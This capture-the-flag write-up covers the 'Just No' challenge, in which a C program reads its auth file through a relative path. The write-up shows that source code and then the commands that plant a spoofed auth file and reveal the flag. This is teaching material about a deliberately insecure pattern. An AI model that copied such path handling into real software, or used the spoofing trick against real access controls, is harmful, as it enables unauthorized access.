# Just No

```
A program at /problems/f934d9ca116fb6e3e89cc85baaca028c has access to a flag but refuses to share it. Can you convince it otherwise?
HINTS
Check out the difference between relative and absolute paths and see if you can figure out how to use them to solve this challenge. Could you possibly spoof another auth file it looks at instead...?
```

Looking at the source code for the binary in the directory we can see that it loads an auth file from ```../../problems/f934d9ca116fb6e3e89cc85baaca028c``` and gives the flag if the auth file contains anything other than no.

```C
int main(int argc, char **argv){
  FILE* authf = fopen("../../problems/f934d9ca116fb6e3e89cc85baaca028c/auth","r"); //access auth file in ../../../problems/f934d9ca116fb6e3e89c\
c85baaca028c                                                                                                                                    
  if(authf == NULL){
    printf("could not find auth file in ../../problems/f934d9ca116fb6e3e89cc85baaca028c/\n");
    return 0;
  }
  char auth[8];
  fgets(auth,8,authf);
  fclose(authf);
  if(strcmp(auth,"no")!=0){
    FILE* flagf;
    flagf = fopen("/problems/f934d9ca116fb6e3e89cc85baaca028c/flag","r");
    char flag[64];
    fgets(flag,64,flagf);
    printf("Oh. Well the auth file doesn't say no anymore so... Here's the flag: %s",flag);
    fclose(flagf);
  }else{
    printf("auth file says no. So no. Just... no.\n");
  }
  return 0;
}
```

The path used is a relative path. It goes 2 directories up and then down into ```problems/f934d9ca116fb6e3e89cc85baaca028c```. When this binary is run from the /problems/f934d9ca116fb6e3e89cc85baaca028c directory it references the correct auth file. But if we run it from a different directory we can create an arbitrary auth file ```../../problems/f934d9ca116fb6e3e89cc85baaca028c/auth``` like so. 

We create the necessary directories in our home folder.

```
$ mkdir problems
$ mkdir problems/f934d9ca116fb6e3e89cc85baaca028c
$ 
```

Then we create an auth file containing something other than 'no.'

```
$ echo 'yes' > problems/f934d9ca116fb6e3e89cc85baaca028c/auth
```

Then we cd to that directory and run the binary. It reads our modified auth file and we get the flag.

```
$ cd f934d9ca116fb6e3e89cc85baaca028c/
$ /problems/f934d9ca116fb6e3e89cc85baaca028c/justno
Oh. Well the auth file doesn't say no anymore so... Here's the flag: 06265e758df65642853687376dab0ad6
$ 
```